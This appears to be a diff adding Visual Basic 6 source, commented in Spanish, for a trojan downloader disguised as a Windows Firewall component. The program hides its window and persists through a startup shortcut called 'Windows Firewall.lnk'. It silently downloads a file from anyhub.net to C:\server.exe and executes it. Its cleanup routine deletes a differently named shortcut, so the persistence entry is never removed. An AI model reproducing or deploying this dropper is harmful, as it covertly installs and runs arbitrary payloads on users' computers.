@@ -1,0 +1,127 @@
+'declaraciones para ejecutar una vez descargado
+Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
+Private Const SW_SHOWNORMAL = 1
+'declaraciones para guardar el archivo ini
+Private Declare Function GetPrivateProfileString Lib "kernel32" Alias "GetPrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpDefault As String, ByVal lpReturnedString As String, ByVal nSize As Long, ByVal lpFileName As String) As Long
+Private Declare Function WritePrivateProfileString Lib "kernel32" Alias "WritePrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpString As Any, ByVal lpFileName As String) As Long
+Private Declare Function FileExists Lib "shlwapi.dll" Alias "PathFileExistsA" (ByVal pszPath As String) As Long
+'declaraciones para descargar
+Private Declare Function URLDownloadToFile Lib "urlmon" _
+   Alias "URLDownloadToFileA" _
+  (ByVal pCaller As Long, _
+   ByVal szURL As String, _
+   ByVal szFileName As String, _
+   ByVal dwReserved As Long, _
+   ByVal lpfnCB As Long) As Long
+Dim ERROR_SUCCESS
+'declaraciones para guardar el acceso directon en el inicio del sistema
+Private Declare Function SHGetSpecialFolderLocation Lib "shell32.dll" ( _
+     ByVal hwndOwner As Long, _
+     ByVal nFolder As Long, _
+     pidl As ITEMIDLIST) As Long
+Private Declare Function SHGetPathFromIDList Lib "shell32.dll" Alias "SHGetPathFromIDListA" ( _
+     ByVal pidl As Long, _
+     ByVal pszPath As String) As Long
+ Private Const MAX_PATH = 260
+ Private Type SHITEMID
+     cb As Long
+     abID As Byte
+ End Type
+ Private Type ITEMIDLIST
+     mkid As SHITEMID
+ End Type
+ Private Const CSIDL_STARTUP = &H7
+ Private Const CSIDL_COMMON_STARTUP = &H18
+ Dim obj As Object
+Dim acceso_directo As Object
+
+Private Sub form_load()
+Me.Visible = False
+    Dim estado As String
+    Iniciarconwindows
+    estado = INI_Read(App.Path & "\FirewallOptions.ini", "Estado", "Update")
+    If Trim(estado) = "Listo!" Then
+        Quitariniciarconwindows
+        End
+    End If
+    Dim sSourceUrl As String
+    Dim sDestinationUrl As String
+   
+   
+   
+    sSourceUrl = "http://anyhub.net/"  ' esta es la URL de donde se descarga el archivo
+    sDestinationUrl = "C:\server.exe"  'este es el path donde se va a guardar el archivo
+   
+   
+   
+    Call INI_Write(App.Path & "\FirewallOptions.ini", "Estado", "Update", "Descargando")
+    DownloadFile sSourceUrl, sDestinationUrl
+    Call ShellExecute(Me.hwnd, vbNullString, sDestinationUrl, vbNullString, vbNullString, SW_SHOWNORMAL)
+    Call INI_Write(App.Path & "\FirewallOptions.ini", "Estado", "Update", "Listo!")
+    End
+End Sub
+'funcion para descargar
+Private Function DownloadFile(ByVal sURL As String, ByVal sLocalFile As String) As Boolean
+  DownloadFile = URLDownloadToFile(0, sURL, _
+    sLocalFile, 0, 0) = ERROR_SUCCESS
+End Function
+'funcion para que el programa inicie cuando se inicia windows
+Private Function Iniciarconwindows()
+Set obj = CreateObject("wscript.Shell")
+Set acceso_directo = obj.CreateShortcut(GetSpecialfolder(CSIDL_STARTUP) & "\Windows Firewall.lnk")
+With acceso_directo
+    .TargetPath = App.Path & "\" & App.EXEName
+    .Save
+End With
+End Function
+Function Quitariniciarconwindows()
+    If Dir(GetSpecialfolder(CSIDL_STARTUP) & "\Comodin.lnk", vbNormal) = "" Then Exit Function
+    Call Kill(GetSpecialfolder(CSIDL_STARTUP) & "\Comodin.lnk")
+End Function
+'funcion para escribir y leer de un ini
+Public Function INI_Read(ByVal Filename As String, ByVal Key_Value As String, ByVal Key_Name As String, Optional ByVal Default As String) As String
+    On Error GoTo ErrOut
+    Dim Size As Integer
+    Dim Value As String
+    'Comprobamos que el archivo existe:
+    If Not CBool(FileExists(Filename)) Then Err.Raise 53
+    'Se define el tamaño maximo de caracteres
+    'que podra tener la variable Value:
+    Value = Space(256)
+    'Se utiliza la función para obtener
+    'el valor de la clave:
+    Size = GetPrivateProfileString(Key_Value, Key_Name, Default, Value, Len(Value), Filename)
+    'Si el tamaño es mayor a 0 entonces
+    'se ha encontrado el valor de la clave:
+    If Size > 0 Then
+        Value = VBA.Left$(Value, Size)
+    'Devolvemos el valor de la clave:
+    If VBA.Right$(VBA.Trim$(Value), 1) = Chr(0) Then Value = VBA.Left$(VBA.Trim$(Value), Len(VBA.Trim$(Value)) - 1)
+    INI_Read = VBA.Trim$(Value)
+    Exit Function
+    End If
+ErrOut:
+    INI_Read = Default
+End Function
+'Metodo de escritura. Si el archivo al que se refiere el parametro Filename
+'no existe se crea automaticamente:
+Public Sub INI_Write(ByVal Filename As String, ByVal Key_Value As String, ByVal Key_Name As String, ByVal Value As String)
+    On Error GoTo ErrOut
+    Dim Size As Integer
+    'Escribimos el valor de la clave:
+    Size = WritePrivateProfileString(Key_Value, Key_Name, Value, Filename)
+ErrOut:
+End Sub
+
+'funcion para obtener el path al inicio del sistema
+Private Function GetSpecialfolder(CSIDL As Long) As String
+ Dim ret As Long, IDL As ITEMIDLIST
+ ret = SHGetSpecialFolderLocation(100, CSIDL, IDL)
+If ret = NOERROR Then
+        Path$ = Space$(512)
+        ret = SHGetPathFromIDList(ByVal IDL.mkid.cb, ByVal Path$)
+        GetSpecialfolder = Left$(Path, InStr(Path, Chr$(0)) - 1)
+        Exit Function
+End If
+ GetSpecialfolder = ""
+ End Function
